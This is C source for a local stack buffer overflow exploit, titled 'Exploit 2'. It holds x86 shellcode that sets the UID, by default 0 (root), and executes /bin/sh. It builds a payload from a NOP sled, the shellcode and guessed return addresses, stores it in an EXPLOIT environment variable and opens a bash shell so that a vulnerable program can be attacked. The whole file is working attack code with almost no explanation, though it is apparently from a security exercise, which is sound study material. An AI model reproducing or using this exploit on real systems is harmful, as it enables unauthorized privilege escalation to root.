#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEFAULT_BUFFER_SIZE 256
#define DEFAULT_STACK_OFFSET 512
#define DEFAULT_UID 0

#define VAR_SIZE 8

char shellcode[] = 
  "\x55"
  "\x89\xe5"
  "\x31\xc0"
  "\x31\xdb"
  "\x31\xc9"
  "\xb0\x46"
  "\x66\xbb\xe9\x03"
  "\x66\xb9\xe9\x03"
  "\xcd\x80"
  "\xeb\x0e"
  "\x5b"
  "\x31\xc9"
  "\x88\x4b\x07"
  "\x31\xd2"
  "\x31\xc0"
  "\xb0\x0b"
  "\xcd\x80"
  "\xe8\xed\xff\xff\xff"
  "/bin/sh"
  ;

void print_info(int sp,int ret) {
  printf("#########################################################\n");
  printf("#                       Exploit 2                       #\n");
  printf("#########################################################\n");
  printf("# Usage: ./exploit1 BUFFER_SIZE STACK_OFFSET UID        #\n");
  printf("#                                                       #\n");
  printf("# Payload set in variable $EXPLOIT                      #\n");
  printf("#                                                       #\n");
  printf("# Default BUFFER_SIZE  : 256                            #\n");
  printf("# Default STACK_OFFSET : 512                            #\n");
  printf("# Default UID          : 0 (root)                       #\n");
  printf("#########################################################\n");
  printf("# Stack Pointer (esp) : 0x%x                      #\n",sp);
  printf("# Using return address: 0x%x                      #\n",ret);
  printf("#########################################################\n");
  printf("# Exploit locked and loaded!                            #\n");
  printf("#########################################################\n\n");
}

int getStack() {
  asm("mov %esp,%eax");
}

int main(int argc, char* argv[]) {
  char* buffer;

  unsigned int buffer_size;
  unsigned int stack_offset;
  unsigned int shell_size;

  unsigned int uid;

  unsigned int sp;
  unsigned int return_addr;

  unsigned int* ret_buff;
  unsigned int ret_size;
  
  unsigned int i,j;

  sp = getStack();

  shell_size = strlen(shellcode);

  buffer_size = (argc >= 2) ? atoi(argv[1]) + VAR_SIZE : DEFAULT_BUFFER_SIZE;
  stack_offset = (argc >= 3) ? atoi(argv[2]) : DEFAULT_STACK_OFFSET;
  uid = (argc >=4) ? atoi(argv[3]) : DEFAULT_UID;

  return_addr = sp - stack_offset;

  buffer = (char*) malloc(sizeof(char)*(buffer_size));

  /* Return Address */
  ret_buff = (unsigned int*) buffer;
  ret_size = buffer_size/4;
  for (i=0;i<ret_size;i++)
    ret_buff[i] = return_addr;

  /* ENV variable name */
  strcpy(buffer,"EXPLOIT=");

  /* NOP sledge */
  i = VAR_SIZE;
  for (i=VAR_SIZE;i<buffer_size/2;i++)
    buffer[i] = 0x90;

  /* Shellcode */
  if (uid == 0) {
    for (j=0;j<11;j++,i++)
      buffer[i] = shellcode[j];

    for (j+=8;j<shell_size;j++,i++)
      buffer[i] = shellcode[j];
  } else {
    char* uid_array = (char*) &uid;
    shellcode[13] = uid_array[0];
    shellcode[14] = uid_array[1];

    shellcode[17] = uid_array[0];
    shellcode[18] = uid_array[1];

    for (j=0;j<shell_size;j++,i++)
      buffer[i] = shellcode[j];
  }

  /*
  buffer[buffer_size-1] = 0x0;
 
    for (i=0; i<buffer_size; i++){
    printf(" %02hhx",(unsigned)buffer[i]);
  }
  printf("\n");

  printf("string = %s\n",buffer);
  */

  putenv(buffer);

  print_info(sp,return_addr);

  system("/bin/bash");

  free(buffer);
}
